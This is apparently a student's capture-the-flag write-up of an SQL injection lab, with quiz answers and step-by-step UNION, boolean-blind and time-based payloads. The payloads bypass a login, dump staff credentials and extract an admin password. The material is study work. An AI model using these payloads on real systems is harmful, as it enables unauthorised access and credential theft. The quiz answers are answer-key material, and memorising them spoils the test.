## *Task 1*
>	- Structured Query Language
## *Task 2*
>	- DBMS
>	- Table
## *Task 3*
>	- SELECT
>	- UNION
>	- INSERT
## *Task 4*
>	- ;
## *In-Band SQLi*
>	- Using `'` to verify SQLi vulnerability.![](sqli-detected.png)
>	- Getting number of columns using `UNION SELECT NULL` and adding nulls till the there is no error.![](union-cols-1.png)
>	- ![](union-cols-2.png)
>	- Changing the id to a non existent article and then getting the database name using `UNION SELECT NULL,NULL,database()`.
>	- ![](db-name.png)
>	- Getting the table names using `UNION SELECT NULL,NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`.![](table-names.png)
>	- Get column names from staff_users table using `UNION SELECT NULL,NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`.![](staff-col-names.png)
>	- Get usernames and passwords using `UNION SELECT NULL,NULL,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`.![](staff-creds.png)
>	- Answer the question and get the flag.![](flag-1.png)
## *Blind SQLi*
>	- Using `' OR 1=1;--` in the password field to bypass the login.![](flag-2.png)
>	- Using `admin123' UNION SELECT NULL;--` to get the column names.![](bool-1.png)
>	- ![](bool-2.png)
>	- Using `' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--` to get the database name.![](bool-3.png)
>	- Change the characters and add more till a true occurs.![](bool-4.png)
>	- Keep adding characters till we get the entire name.![](bool-5.png)
>	- Now use the found name to enumerate the tables.
>	- Using `' UNION SELECT 1,2,3 FROM infromation_schema.tables WHERE table_schema = 'sqli_three' AND table_name LIKE 'u%';--`.![](bool-6.png)
>	- Again keep adding characters till the table name is found.![](bool-7.png)
>	- Confirm the table name using `' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' AND table_name = 'users';--`.![](bool-8.png)
>	- Now, enumerate the column names in the users table using `' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema = 'sqli_three' AND table_name = 'users' AND column_name LIKE 'a%';--`.
>	- Column `id` is found.![](bool-9.png)
>	- Now remove that found column name `' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema = 'sqli_three' AND table_name = 'users' AND column_name LIKE 'a%' AND column_name != 'id';--`.
>	- Column username is found.![](bool-10.png)
>	- Column password is found.![](bool-11.png)
>	- Now, enumerate the users table for the username admin using `' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--`.![](bool-12.png)
>	- Admin user is found.![](bool-13.png)
>	- Enumerating for his password using `' UNION SELECT 1,2,3 FROM users WHERE username = 'admin' AND password LIKE 'a%';--`.![](bool-14.png)
>	- Confirming the password.![](bool-15.png)
>	- Using the found credentials to get the flag.![](flag-3.png)
>	- Using `' UNION SELECT SLEEP(5);--` to get the count of columns by waiting for a delay if the count is correct.![](time-1.png)
>	- When using `' UNION SELECT SLEEP(5),2;--` the response is delayed, so the count is correct.![](time-2.png)
>	- Get database name using `' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'a%';--`.![](time-3.png)
>	- Adding more characters and using a different time just to make sure.![](time-4.png)
>	- ![](time-5.png)
>	- Confirming the database name using `' UNION SELECT SLEEP(6),2 WHERE database() = 'sqli_four';--`.![](time-6.png)
>	- Get tables using `' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' AND table_name LIKE 'a%';--`.![](time-7.png)
>	- Table user found using `' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' AND table_name LIKE 'users%';--`.![](time-8.png)
>	- Get columns using `' UNION SELECT SLEEP(6),2 FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE 'u%';--`.![](time-9.png)
>	- Column username found using `' UNION SELECT SLEEP(5),2 FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE 'username%';--`.![](time-10.png)
>	- Column password found using `' UNION SELECT SLEEP(6),2 FROM information_schema.columns WHERE table_name = 'users' AND column_name != 'username' AND column_name LIKE 'password%';--`.![](time-11.png)
>	- Now, using `' UNION SELECT SLEEP(5),2 FROM users WHERE username LIKE 'admin%';--` to check for an admin account.![](time-12.png)
>	- Get the password of the admin account using `' UNION SELECT SLEEP(6),2 FROM users WHERE username = 'admin' AND password LIKE 'a%';--`.![](time-13.png)
>	- First character of the password is `4`.![](time-14.png)
>	- The password is found using `' UNION SELECT SLEEP(5),2 FROM users WHERE username = 'admin' AND password LIKE '4961';--`.![](time-15.png)
>	- Confirming the password using `' UNION SELECT SLEEP(6),2 FROM users WHERE username = 'admin' AND password = '4961';--`.![](time-16.png)
>	- Fourth flag is found after logging in with the found credentials.![](flag-4.png)
## *Task 9*
>	- DNS
## *Task 10*
>	- Prepared Statements
